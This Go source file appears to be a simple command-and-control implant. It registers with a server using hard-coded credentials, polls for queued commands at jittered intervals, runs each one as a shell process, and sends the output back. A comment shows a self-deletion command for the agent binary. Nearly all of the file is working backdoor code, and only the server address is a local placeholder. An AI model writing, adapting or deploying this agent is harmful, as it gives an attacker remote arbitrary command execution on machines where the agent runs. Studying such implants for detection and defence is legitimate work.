package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

type Agent_info struct {
	Agent_name       string
	Delay_time_min   int
	Delay_time_max   int
	Create_time      string
	Last_online_time string
}

type Cmd_info struct {
	Id                      int
	Agent_name              string
	Cmd_type                string
	Cmd_value               string
	Cmd_time                string
	Cmd_exec                bool
	Cmd_exec_time           string
	Cmd_exec_result         string
	Cmd_cycle_period_second int
}

type Register_info struct {
	Action     string
	Agent_name string
}

var server_addr = "http://127.0.0.1:8080/"
var register_addr = server_addr + "register"
var get_cmd_not_exec_info_addr = server_addr + "get_cmd_not_exec/"
var update_cmd_not_exec_info_addr = server_addr + "update_cmd_result"

var Agent_info_v = Agent_info{
	Agent_name:     "test",
	Delay_time_min: 1,
	Delay_time_max: 5}

func get_delay_time() int {
	delay_time_min := Agent_info_v.Delay_time_min
	delay_time_max := Agent_info_v.Delay_time_max
	if delay_time_min >= delay_time_max {
		return delay_time_min
	}
	rand.Seed(time.Now().Unix())
	return rand.Intn(delay_time_max-delay_time_min) + delay_time_min

}

func runCmd(cmdStr string) (string, error) {
	// "/bin/bash -c ls"
	// "cmd.exe /c del /q agent.elf"
	list := strings.Split(cmdStr, " ")
	cmd := exec.Command(list[0], list[1:]...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return stderr.String() + "\n cmd errors\n" + err.Error(), err
	} else {
		return out.String(), nil
	}
}

func Send_info(server_addr string, data string) (string, string) {
	reqest, err := http.NewRequest("POST", server_addr, strings.NewReader(data))
	reqest.Header.Set("Content-Type", "application/json; charset=utf-8")
	reqest.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte("admin:post")))
	client := &http.Client{}
	resp, err := client.Do(reqest)
	if err != nil {
		return "error", "error"
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println("status", resp.Status)
	return resp.Status, string(body)
}

func Get_Cmds_not_exec_info(server_addr string, agent_name string) ([]Cmd_info, error) {
	cmd_infos := []Cmd_info{}
	server_addr_with_name := server_addr + agent_name
	reqest, err := http.NewRequest("GET", server_addr_with_name, nil)
	if err != nil {
		fmt.Println("Get_info", err.Error())
		return cmd_infos, err
	}
	reqest.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte("admin:get")))
	client := &http.Client{}
	resp, err := client.Do(reqest)
	if err != nil {
		return cmd_infos, err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	err = json.Unmarshal(body, &cmd_infos)
	if err != nil {
		return cmd_infos, err
	}
	return cmd_infos, nil
}

func register_2_server() {
	agent_name := Agent_info_v.Agent_name // + "_" + time.Now().Format("2006_01_02_15_04_05")
	data_json, _ := json.Marshal(Register_info{Action: "register", Agent_name: agent_name})
	for {
		stat, body := Send_info(register_addr, string(data_json))
		fmt.Println(stat, body)
		if stat == "200 OK" {
			send_data_v := Register_info{}
			err := json.Unmarshal([]byte(body), &send_data_v)
			if err == nil {
				if send_data_v.Agent_name == agent_name {
					fmt.Println("reg ok")
					break
				}
			}
		}

		time.Sleep(time.Duration(get_delay_time()) * time.Second)
	}
}

func main() {
	register_2_server()
	for {
		cmd_infos, err := Get_Cmds_not_exec_info(get_cmd_not_exec_info_addr, Agent_info_v.Agent_name)
		fmt.Println(cmd_infos)
		if err != nil {
			fmt.Println("get cmds error", err)
		} else {
			for _, cmd_info := range cmd_infos {
				fmt.Println(cmd_info)
				cmd_info.Cmd_time = time.Now().Format("2006-01-02 15:04:05")
				if cmd_info.Cmd_type == "cmd" {
					cmd_info.Cmd_exec_result, err = runCmd(cmd_info.Cmd_value)
					fmt.Println(cmd_info.Cmd_exec_result)
					if err != nil {
						fmt.Println(err)
					} else {
						cmd_info.Cmd_exec = true
						cmd_info.Cmd_exec_time = time.Now().Format("2006-01-02 15:04:05")
						data, _ := json.Marshal(cmd_info)
						Send_info(update_cmd_not_exec_info_addr, string(data))
					}
				}
			}
		}
		time.Sleep(time.Duration(get_delay_time()) * time.Second)
	}
}
